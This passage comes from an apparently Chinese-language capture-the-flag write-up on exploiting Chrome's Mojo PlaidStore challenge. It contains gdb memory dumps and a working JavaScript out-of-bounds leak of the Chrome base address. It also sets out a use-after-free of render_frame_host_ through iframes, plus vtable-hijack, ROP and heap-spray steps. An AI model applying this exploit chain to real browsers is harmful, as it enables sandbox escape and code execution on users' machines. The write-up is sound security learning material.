class="line">&#125;</span><br></pre></td></tr></table></figure>其实只有一个字段，也就是保存了一个<code>__tree</code>类型的成员变量，其实这就是红黑树(rb tree)的实现，map其实是rb tree的一层wrapper，实际的插入删除等，都是在<code>__tree</code>上完成的。<br>所以我们直接看<code>__tree</code>的内存布局即可。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">Compare</span>, <span class="title">class</span> _<span class="title">Allocator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    __iter_pointer                                     __begin_node_;</span><br><span class="line">    __compressed_pair&lt;<span class="keyword">__end_node_t</span>, __node_allocator&gt;  __pair1_;</span><br><span class="line">    __compressed_pair&lt;size_type, value_compare&gt;        __pair3_;</span><br></pre></td></tr></table></figure>其有三个成员变量，一个是指向起始tree_node的指针，其他两个字段用不到，也就不解释了。<br>那么我们现在就知道了，对于如下impl，其偏移0x10位置处就是保持着map的起始节点，而map是一颗rb tree，所以从这个节点我们就可以索引到其他所有插入的节点了。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx 0x2dd26ed2ede0</span><br><span class="line">0x2dd26ed2ede0:0x000055555f50a7a0 &#x2F;&#x2F;vtable0x00002dd26ec42400 &#x2F;&#x2F; render_frame_host_</span><br><span class="line">0x2dd26ed2edf0:|map start| 0x00002dd26ed2edf8 0x0000000000000000</span><br><span class="line">0x2dd26ed2ee00:0x0000000000000000|map end| --&gt; &#x2F;&#x2F; data_store_</span><br></pre></td></tr></table></figure>现在让我们看一下tree_node的具体内存布局<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Pointer</span>&gt; <span class="title">class</span> __<span class="title">tree_end_node</span>;</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">VoidPtr</span>&gt; <span class="title">class</span> __<span class="title">tree_node_base</span>;</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">VoidPtr</span>&gt; <span class="title">class</span> __<span class="title">tree_node</span>;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// node</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Pointer</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_end_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Pointer pointer;</span><br><span class="line">    pointer __left_;</span><br><span class="line"></span><br><span class="line">    _LIBCPP_INLINE_VISIBILITY</span><br><span class="line">    __tree_end_node() _NOEXCEPT : __left_() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">VoidPtr</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_node_base</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">public</span> __tree_node_base_types&lt;_VoidPtr&gt;::__end_node_type</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">typedef</span> __tree_node_base_types&lt;_VoidPtr&gt; _NodeBaseTypes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeBaseTypes::__node_base_pointer pointer;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> _NodeBaseTypes::__parent_pointer __parent_pointer;</span><br><span class="line"></span><br><span class="line">    pointer          __right_;</span><br><span class="line">    __parent_pointer __parent_;</span><br><span class="line">    <span class="keyword">bool</span> __is_black_;</span><br><span class="line"></span><br><span class="line">    _LIBCPP_INLINE_VISIBILITY</span><br><span class="line">    pointer __parent_unsafe() <span class="keyword">const</span> &#123; <span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;pointer&gt;(__parent_);&#125;</span><br><span class="line"></span><br><span class="line">    _LIBCPP_INLINE_VISIBILITY</span><br><span class="line">    <span class="keyword">void</span> __set_parent(pointer __p) &#123;</span><br><span class="line">        __parent_ = <span class="keyword">static_cast</span>&lt;__parent_pointer&gt;(__p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  ~__tree_node_base() _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node_base(__tree_node_base <span class="keyword">const</span>&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node_base&amp; <span class="keyword">operator</span>=(__tree_node_base <span class="keyword">const</span>&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Tp</span>, <span class="title">class</span> _<span class="title">VoidPtr</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> __<span class="title">tree_node</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">public</span> __tree_node_base&lt;_VoidPtr&gt;</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Tp __node_value_type;</span><br><span class="line"></span><br><span class="line">    __node_value_type __value_;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  ~__tree_node() _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node(__tree_node <span class="keyword">const</span>&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node&amp; <span class="keyword">operator</span>=(__tree_node <span class="keyword">const</span>&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>所以对于一个tree_node，其保存的字段依次为，前四个大小是固定的，其整体大小依据<code>__node_value_type</code>的大小来决定，这个node_value_type实际上就是key-value这样一个pair对，在这里就是<code>pair&lt;string,vector&lt;uint8_t&gt;&gt;</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x0 pointer __left_;</span><br><span class="line">0x8 pointer          __right_;</span><br><span class="line">0x10 __parent_pointer __parent_;</span><br><span class="line">0x18 bool __is_black_;</span><br><span class="line">0x20 __node_value_type __value_;</span><br></pre></td></tr></table></figure>所以我们来看一下内存<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;PlaidStoreImpl</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x00003268b2727f00</span><br><span class="line">0x3268b2727f00:0x000055555f50a7a00x00003268b2643400</span><br><span class="line">0x3268b2727f10:0x00003268b271a780&#x2F;&#x2F;first tree node0x00003268b271a780</span><br><span class="line">0x3268b2727f20:0x0000000000000001</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx 0x00003268b271a780</span><br><span class="line">0x3268b271a780:0x00000000000000000x0000000000000000</span><br><span class="line">0x3268b271a790:0x00003268b2727f180x0000000000000001</span><br><span class="line">0x3268b271a7a0:|0x00000000616161610x0000000000000000</span><br><span class="line">0x3268b271a7b0:0x0400000000000000|--&gt;string | 0x00003268b2757ba0--&gt;vector</span><br><span class="line">0x3268b271a7c0:0x00003268b2757bc80x00003268b2757bc8 |</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F; vector elements</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x00003268b2757ba0</span><br><span class="line">0x3268b2757ba0:0x31313131313131310x3131313131313131</span><br><span class="line">0x3268b2757bb0:0x31313131313131310x3131313131313131</span><br><span class="line">0x3268b2757bc0:0x31313131313131310x0000000000000000</span><br></pre></td></tr></table></figure>string的对象布局我没有看，不过我简单的解释一下这里为什么vector是这样的，因为其包括三个成员变量，首先是vector里元素的起始地址，然后是终止地址和容量。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> __<span class="title">vector_base</span></span></span><br><span class="line"><span class="class">    <span class="title">pointer</span>                                         __<span class="title">begin_</span>;</span></span><br><span class="line">    pointer                                         __end_;</span><br><span class="line">    __compressed_pair&lt;pointer, allocator_type&gt; __end_cap_;</span><br></pre></td></tr></table></figure>而此时我们的oob，也就是从vector的起始地址开始，可以越界读到后面的任意地址的值。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap 0x00003268b2757ba0</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x00003268b237d000 0x00003268b287c000 rw-pmapped</span><br><span class="line">gdb-peda$ vmmap 0x00003268b2727f00</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x00003268b237d000 0x00003268b287c000 rw-pmapped</span><br></pre></td></tr></table></figure>由于impl和vector在同一段上，其应该都是通过partitionAlloc动态分配出来的，所以我们可以大量分配impl，从而使impl和vector接近线性交替存放，并最终leak出来，这里我们的判断依据是虚表地址是页对齐的，也就是最后的0x7a0是不变的，从而找到虚表地址。<br>因为虚表地址在chrome的只读数据段中(.rodata)上，所以可以通过减去偏移找到chrome的基地址。<br>这个偏移的计算相当简单，我一般直接vmmap看一下加载基地址，然后减去即可找到偏移。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap 0x55555f50a7a0</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x000055555f455000 0x000055555faf2000 r--p&#x2F;home&#x2F;sakura&#x2F;mojo&#x2F;chrome</span><br><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x000023612d770000 0x000023612d771000 ---pmapped</span><br><span class="line">0x000023612d771000 0x000023612dc70000 rw-pmapped</span><br><span class="line">0x0000555555554000 0x000055555824b000 r--p&#x2F;home&#x2F;sakura&#x2F;mojo&#x2F;chrome</span><br><span class="line">0x000055555824b000 0x000055555f455000 r-xp&#x2F;home&#x2F;sakura&#x2F;mojo&#x2F;chrome</span><br><span class="line">0x000055555f455000 0x000055555faf2000 r--p&#x2F;home&#x2F;sakura&#x2F;mojo&#x2F;chrome</span><br><span class="line">0x000055555faf2000 0x000055555fb4e000 rw-p&#x2F;home&#x2F;sakura&#x2F;mojo&#x2F;chrome</span><br><span class="line">...</span><br><span class="line">gdb-peda$ p&#x2F;x 0x55555f50a7a0-0x0000555555554000</span><br><span class="line">$1 &#x3D; 0x9fb67a0</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">async function <span class="title">oob</span><span class="params">()</span></span>&#123;</span><br><span class="line">  console.<span class="built_in">log</span>(<span class="string">"oob"</span>);</span><br><span class="line">  var ps_list = [];</span><br><span class="line">  var try_size = <span class="number">100</span>;</span><br><span class="line">  var vt_addr = <span class="number">0</span>;</span><br><span class="line">  var render_frame_host_addr = <span class="number">0</span>;</span><br><span class="line">  var code_base = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(let i = <span class="number">0</span>; i &lt; try_size; i++)&#123; <span class="comment">//创建impl并store一些数据，从而创建vector</span></span><br><span class="line">    var pipe = Mojo.createMessagePipe();</span><br><span class="line">    Mojo.bindInterface(<span class="built_in">blink</span>.mojom.PlaidStore.name,</span><br><span class="line">      pipe.handle1, <span class="string">"context"</span>, <span class="literal">true</span>);</span><br><span class="line">    var tmp_ps_ptr = <span class="keyword">new</span> <span class="built_in">blink</span>.mojom.PlaidStorePtr(pipe.handle0);</span><br><span class="line">    await tmp_ps_ptr.storeData(<span class="string">"aaaa"</span>, <span class="keyword">new</span> Array(<span class="number">0x30</span>).<span class="built_in">fill</span>(<span class="number">0x31</span>))</span><br><span class="line">    ps_list.push(tmp_ps_ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(let i = <span class="number">0</span>; i &lt; try_size; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(vt_addr != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    var tmp_ps_ptr = ps_list[i];</span><br><span class="line">    let r = await tmp_ps_ptr.getData(<span class="string">"aaaa"</span>, <span class="number">0x100</span>); <span class="comment">//越界读取，这里设置成0x100，不能太大，防止读到一些不可访问的地址</span></span><br><span class="line">    let oob_data = r.data;</span><br><span class="line">    <span class="keyword">for</span>(let i = <span class="number">0x30</span>; i &lt; <span class="number">0x100</span>; i = i + <span class="number">8</span>)&#123;</span><br><span class="line">      let tmp_oob_data = b2i(oob_data.slice(i, i+<span class="number">8</span>)); <span class="comment">//因为读取到的是byte数组，所以要转回数值</span></span><br><span class="line">      <span class="keyword">if</span>(hex(tmp_oob_data &amp; <span class="number">0xfff</span>) == <span class="string">"0x7a0"</span>)&#123;</span><br><span class="line">          vt_addr = tmp_oob_data;</span><br><span class="line">          code_base = vt_addr - <span class="number">0x9fb67a0</span>;</span><br><span class="line">          console.log('vt_addr is: ', hex(vt_addr));</span><br><span class="line">          console.log('code_base is: ', hex(code_base));</span><br><span class="line">          render_frame_host_addr = b2i(oob_data.slice(i+<span class="number">8</span>, i+<span class="number">16</span>));</span><br><span class="line">          console.log('render_frame_host_addr is: ', hex(render_frame_host_addr));</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  r2p_rfh(hex(render_frame_host_addr));</span><br><span class="line">  r2p_code_base(hex(code_base));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>有了chrome的基地址，我们就可以搜索gadget来构造rop了，这里我直接参考了<a href="https://blog.keenan.top/2020/08/06/PlaidCTF-2020-PlaidStore-Mojo/" target="_blank" rel="noopener">这篇文章</a>里使用的gadaget。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary&#x3D;.&#x2F;chrome &gt; gadget.txt</span><br></pre></td></tr></table></figure><p>也可以这样，然后直接在文件里find需要的gadget，不再赘述。</p><p>虚表其实就是保存着函数地址的表，虚函数调用的时候，首先根据保存的虚表地址(vtable entry)，找到虚函数表，然后再根据偏移在虚表里找到对应的函数地址。<br>所以只要改掉了其保存的函数地址，就可以在执行对应的虚函数时去执行任意代码。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-150830.png" alt=""><br>我们来看一个正常的虚函数调用的汇编，这里我断在GetData，<code>getData(&quot;aaaa&quot;, 0x100)</code>，虚函数调用也还是成员函数，所以第一个参数是this，也就是render_frame_host_的地址，然后key是”aaaa”，count是0x100。</p><p>如图看寄存器，rdi是<code>0x88313358100</code>，rsi是”aaaa”，rdx是0x100，和我们刚刚的推论吻合。<br>再看汇编。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    rbx,rdi &#x2F;&#x2F; rdi指向PlaidStoreImpl，是this</span><br><span class="line">mov    rdi,QWORD PTR [rdi+0x8] &#x2F;&#x2F;取其偏移0x8的位置的值，刚好就是render_frame_host，到rdi</span><br><span class="line">mov    rax,QWORD PTR [rdi] &#x2F;&#x2F;取render_frame_host_偏移0x0位置的值，也就是vtable entry到rax里</span><br><span class="line">call   QWORD PTR [rax+0x160] &#x2F;&#x2F;vtable entry指向虚表基地址vt_base_addr，call将跳转到vt_base_addr+0x160处保存的函数地址去执行。</span><br></pre></td></tr></table></figure><p>这里就是在call虚函数IsRenderFrameLive，这个函数的地址保存在[rax+0x160]，而由于前面所述的UAF的原因，render_frame_host_地址处的所有内容完全可控，所以rax的值我们完全可控。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">    GetDataCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive()) &#123; <span class="comment">// use</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>chrome上比较常用的是劫持栈指针到我们可控的位置,这里<code>render_frame_host_</code>里的内容我们就完全可控，我们可以把栈指针劫持到<code>render_frame_host_</code>上。<br>让rax里保存的地址为<code>addr render_frame_host_+0x10</code>，这里就是新的虚表了。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-160738.jpg" alt=""></p><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>接下来的执行将分成两部分。</p><ul><li>首先对于<code>#parent</code><ul><li>创建一个child iframe</li><li>然后通过MojoTest flag的特性，创建一个kPwnInterfaceName拦截器，并注册对应的处理函数</li><li>处理函数逻辑为<ul><li>关闭拦截器</li><li>从接收到的MojoInterfaceRequestEvent里取出传过来的handle，用来初始化一个PlaidStorePtr指针plaid_store_ptr</li><li>返回这个指针给<code>#parent</code></li></ul></li><li>打开拦截器</li></ul></li><li>对于<code>#child</code><ul><li>执行oob函数来leak出自己的render_frame_host_和chrome的基地址</li><li>创建Message pipe，将receiver端传给browser，用来bind到一个PlaidStoreImpl实例上</li><li>将remote端通过<code>Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, &quot;process&quot;);</code>发给拦截器，从而触发对应的处理函数。</li></ul></li><li>这样即使child iframe被remove掉，remote端仍被parent持有，所以message pipe不会被中断，和其绑定的child iframe里对应的PlaidStoreImpl也不会被析构，但此时PlaidStoreImpl里保存的child iframe的render_frame_host_已经被析构掉了。</li><li>此时，通过<code>#parent</code>里保存的plaid_store_ptr，就可以从remote端调用browser里PlaidStoreImpl的函数，从而触发UAF，具体代码如下:<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">allocateRFH</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    iframe.src = src;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">    <span class="keyword">return</span> iframe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">freeRFH</span>(<span class="params">iframe</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kPwnInterfaceName = <span class="string">"pwn"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendPtr</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pipe = Mojo.createMessagePipe();</span><br><span class="line">    <span class="comment">// bind the InstalledAppProvider with the child rfh</span></span><br><span class="line">    Mojo.bindInterface(blink.mojom.PlaidStore.name,</span><br><span class="line">        pipe.handle1, <span class="string">"context"</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// pass the endpoint handle to the parent rfh</span></span><br><span class="line">    Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, <span class="string">"process"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFreedPtr</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// create child iframe, allocate new RenderFrameHost</span></span><br><span class="line">        <span class="keyword">var</span> frame = allocateRFH(<span class="built_in">window</span>.location.href + <span class="string">"#child"</span>); <span class="comment">// designate the child by hash</span></span><br><span class="line">        <span class="comment">// intercept bindInterface calls for this process to accept the handle from the child</span></span><br><span class="line">        <span class="keyword">let</span> interceptor = <span class="keyword">new</span> MojoInterfaceInterceptor(kPwnInterfaceName, <span class="string">"process"</span>);</span><br><span class="line">        interceptor.oninterfacerequest = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// e is MojoInterfaceRequestEvent</span></span><br><span class="line">            interceptor.stop();</span><br><span class="line">            <span class="comment">// bind the remote</span></span><br><span class="line">            <span class="keyword">var</span> plaid_store_ptr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr(e.handle);</span><br><span class="line">            <span class="comment">// get child iframe render_frame_host_addr</span></span><br><span class="line">            iframe_render_frame_host_addr = <span class="built_in">parseInt</span>(<span class="built_in">window</span>.frames[<span class="number">0</span>].window.document.getElementById(<span class="string">'render_frame_host_addr'</span>).innerText);</span><br><span class="line">            code_base = <span class="built_in">parseInt</span>(<span class="built_in">window</span>.frames[<span class="number">0</span>].window.document.getElementById(<span class="string">'code_base'</span>).innerText);</span><br><span class="line">            freeRFH(frame);</span><br><span class="line">            resolve(plaid_store_ptr);</span><br><span class="line">        &#125;</span><br><span class="line">        interceptor.start();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// for #child</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.location.hash == <span class="string">"#child"</span>) &#123;</span><br><span class="line">        <span class="keyword">await</span> oob();</span><br><span class="line">        sendPtr();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// for #parent</span></span><br><span class="line">    iframe_render_frame_host_addr = <span class="number">0</span>;</span><br><span class="line">    code_base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">var</span> try_size = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">var</span> kRenderFrameHost = <span class="number">0xc28</span>;</span><br><span class="line">    <span class="keyword">let</span> ptr = <span class="keyword">await</span> getFreedPtr();<span class="comment">// free iframe</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>剩下最后一个问题，如何通过heap spray来占坑我们之前释放掉的iframe里的<code>render_frame_host_</code>，其实很简单，因为chrome里heap management是使用TCMalloc的。<br>所以我们通过StoreData分配出来的<code>vector&lt;uint8_t&gt;</code>和<code>render_frame_host_</code>是使用同样的分配器，也就是只要大量分配大小和<code>render_frame_host_</code>相等的vector就可能占位上。</li></ul><p>这里我们先看一下<code>render_frame_host_</code>的大小，步骤如下，最终找到大小是0xc28 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info functions RenderFrameHostImpl::RenderFrameHostImpl</span><br><span class="line">All functions matching regular expression 